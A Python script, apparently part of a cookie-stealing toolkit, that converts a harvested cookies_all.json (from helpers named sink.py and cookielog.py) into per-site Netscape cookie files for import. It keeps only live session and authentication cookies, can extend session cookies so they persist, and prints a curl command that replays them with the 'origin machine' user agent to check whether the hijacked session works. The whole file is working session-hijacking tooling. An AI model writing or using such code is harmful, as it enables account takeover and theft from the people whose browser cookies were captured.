# swap.py -- turns cookies_all.json into a cookies.txt PER SITE, ready to import.
#   python swap.py                        lists the sites on hand
#   python swap.py netflix                swap\netflix.com.txt (everything that has not expired)
#   python swap.py netflix --session      only the live session
#   python swap.py netflix --session --keep
#   python swap.py google --auth          only the names that authenticate
import json, os, re, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
OUT  = os.path.join(HERE, "swap")
TWO  = {"co.uk","com.br","com.au","co.jp","com.mx","com.ar","co.za","com.pt","co.in","com.co"}

JUNK = re.compile(r"^(_ga|_gid|_gat|_gcl|_fbp|_fbc|_fr|fr|IDE|msclkid|ttwid|_uetsid|_uetbid|"
                  r"_clck|_clsk|_pk_|_matomo|_piwik|_ym|_hp[12]|_kuid|_kyo|uidsi|cto_|_l_KPI|"
                  r"_chku|_ch-|mp_|_hsf|_rb_|_mcid|test_cookie|__cf_bm$|__cfruid$|_abck$|bm_sz$|"
                  r"_cfuvid$|s_vp|s_fid|am-5|aamid|sat_|gpv_|dl_|_device_id|mx_platform_data)", re.I)
AUTH = re.compile(r"(sess|sid|^sid$|jsession|phpsess|asp\.net|xsr|laravel|ci_session|django|"
                  r"wordpress|wp-pass|wp_|^bb|drupal|user|uid|login|auth|token|remember|"
                  r"^__secure-|^__host-|account|sessionid|connect\.sid|csrftoken|xsrf)", re.I)

def base(dom):
    d = (dom or "").lstrip(".").lower(); p = d.split(".")
    if len(p) > 2 and ".".join(p[-2:]) in TWO: return ".".join(p[-3:])
    return ".".join(p[-2:]) if len(p) > 1 else d

def keep(c, session, auth, now):
    e = int(c.get("expires") or 0)
    if e and e < now - 300: return False                    # expired never works
    if session and e: return False                           # session = no recorded expiry
    nm = c.get("name") or ""
    if JUNK.search(nm): return False
    if auth and not AUTH.search(nm): return False
    return True

def line(c, keep_flag, plain, now):
    dom = c["domain"] if c["domain"].startswith(".") else "." + c["domain"]
    exp = int(c.get("expires") or 0)
    if not exp: exp = now + 31_536_000 if keep_flag else 0
    secure = bool(c.get("secure")) or c.get("sameSite") == "None"   # None without Secure is discarded
    if not plain and c.get("httpOnly"): dom = "#HttpOnly_" + dom
    return "\t".join([dom, "TRUE", c.get("path") or "/", "TRUE" if secure else "FALSE",
                      str(exp), c["name"], c.get("value") or ""])

def main():
    j = os.path.join(HERE, "cookies_all.json")
    if not os.path.exists(j): sys.exit("run sink.py or cookielog.py first")
    cookies = json.load(open(j, encoding="utf-8"))
    a  = sys.argv[1:]
    fl = {x for x in a if x.startswith("--")}
    want = next((x for x in a if not x.startswith("--")), None)
    session, auth, keepf, plain = ("--session" in fl, "--auth" in fl,
                                  "--keep" in fl, "--plain" in fl)
    if session and "--keep" not in fl and want:
        print("[!] without --keep the browser discards this on tab close")
    now, groups = int(time.time()), {}
    for c in cookies:
        if not keep(c, session, auth, now): continue
        if (ln := line(c, keepf, plain, now)): groups.setdefault(base(c["domain"]), []).append(ln)

    os.makedirs(OUT, exist_ok=True)
    if not want:
        for b, v in sorted(groups.items(), key=lambda kv: -len(kv[1]))[:40]: print(f"{len(v):6d}  {b}")
        print("\npython swap.py <domain> [--session] [--auth] [--keep] [--plain]")
        return
    hits = {b: v for b, v in groups.items() if want in b}
    if not hits: sys.exit(f"nothing matching '{want}'" + (" with these filters" if fl else "")
                          + ": " + ", ".join(sorted(groups))[:700])
    for b, v in hits.items():
        f = os.path.join(OUT, b + ".txt")
        open(f, "w", encoding="utf-8").write("# Netscape HTTP Cookie File\n" + "\n".join(v) + "\n")
        print(f"[+] {len(v):5d} cookies -> {f}")
        print(f'    check whether the session is actually valid: curl -b "{f}" -o nul -w "%{{http_code}}\\n"'
              f' -A "SAME_UA_FROM_ORIGIN_MACHINE" https://www.{b}/')

main()
